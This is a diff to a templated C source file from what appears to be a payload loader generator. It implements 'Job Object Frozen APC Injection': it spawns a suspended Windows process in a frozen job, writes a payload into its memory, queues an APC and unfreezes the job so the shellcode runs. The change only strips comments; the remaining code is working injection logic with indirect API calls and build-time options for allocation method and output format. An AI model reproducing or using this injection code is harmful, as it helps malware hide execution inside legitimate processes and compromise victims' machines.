@@ -31,7 +31,6 @@ void ExecutePayload(void* exec_mem_unused, const unsigned char* payload, SIZE_T 
 
     DEBUG_PRINT("Executing payload via Job Object Frozen APC Injection...");
 
-    // --- 1. Create Job Object ---
     DEBUG_PRINT("Creating job object for process freezing...");
     NTSTATUS jobStatus = pfnNtCreateJobObject(&hJob, JOB_OBJECT_ALL_ACCESS, NULL);
     if (!NT_SUCCESS(jobStatus)) {
@@ -39,7 +38,6 @@ void ExecutePayload(void* exec_mem_unused, const unsigned char* payload, SIZE_T 
         return;
     }
 
-    // --- 2. Configure Job Freezing ---
     JOBOBJECT_FREEZE_INFORMATION freezeInfo = { 0 };
     freezeInfo.FreezeOperation = 1;
     freezeInfo.Freeze = TRUE;
@@ -52,7 +50,6 @@ void ExecutePayload(void* exec_mem_unused, const unsigned char* payload, SIZE_T 
         return;
     }
 
-    // --- 3. Path Construction (ORIGINAL CODE) ---
     if (!pfnGetEnvironmentVariableA("WINDIR", WnDr, MAX_PATH)) {
         DEBUG_PRINT("GetEnvironmentVariableA failed with error %d", pfnGetLastError());
         goto cleanup_job;
@@ -89,7 +86,6 @@ void ExecutePayload(void* exec_mem_unused, const unsigned char* payload, SIZE_T 
     pfnRtlZeroMemory(sTargetProcess, sizeof(sTargetProcess));
     {% endif %}
 
-    // --- 4. Create Suspended Process in Job ---
     DEBUG_PRINT("Creating suspended process in job object...");
     
     STARTUPINFOA si;
@@ -105,7 +101,6 @@ void ExecutePayload(void* exec_mem_unused, const unsigned char* payload, SIZE_T 
         goto cleanup_job;
     }
 
-    // Assign process to job
     jobStatus = pfnNtAssignProcessToJobObject(hJob, pi.hProcess);
     if (!NT_SUCCESS(jobStatus)) {
         DEBUG_PRINT("NtAssignProcessToJobObject failed: 0x%X", jobStatus);
@@ -117,14 +112,9 @@ void ExecutePayload(void* exec_mem_unused, const unsigned char* payload, SIZE_T 
     dwProcessId = pi.dwProcessId;
     DEBUG_PRINT("Successfully created suspended process in job with PID: %lu", dwProcessId);
 
-    // --- 5. Resume Process (Threads remain frozen) ---
     DEBUG_PRINT("Resuming process - threads remain frozen by job object...");
     pfnResumeThread(hThread);
 
-    // Brief wait for process initialization while frozen
-    //pfnSleep(1000);
-
-    // --- 6. Allocate and Write Payload ---
     {% if allocation_method == 'virtualalloc' %}
         DEBUG_PRINT("Using VirtualAllocEx for remote memory allocation...");
         DWORD dwOldProt = 0;
@@ -172,11 +162,9 @@ void ExecutePayload(void* exec_mem_unused, const unsigned char* payload, SIZE_T 
         pfnCloseHandle(hSection);
     {% endif %}
 
-    // --- 7. Queue APC to Frozen Threads ---
     DEBUG_PRINT("Queuing APC to frozen thread at %p", pRemoteAddress);
     pfnQueueUserAPC((PAPCFUNC)pRemoteAddress, hThread, (ULONG_PTR)NULL);
 
-    // --- 8. Unfreeze Job to Execute APC ---
     DEBUG_PRINT("Unfreezing job to execute APC...");
     freezeInfo.Freeze = FALSE;
     jobStatus = pfnNtSetInformationJobObject(hJob, (JOBOBJECTINFOCLASS)JobObjectFreezeInformation, 
@@ -185,7 +173,6 @@ void ExecutePayload(void* exec_mem_unused, const unsigned char* payload, SIZE_T 
         DEBUG_PRINT("NtSetInformationJobObject (unfreeze) failed: 0x%X", jobStatus);
     }
 
-    // --- 9. Wait for Execution ---
     {% if output_format == 'dll' %}
     DEBUG_PRINT("DLL mode - waiting for process execution...");
     pfnWaitForSingleObject(hProcess, 10000);
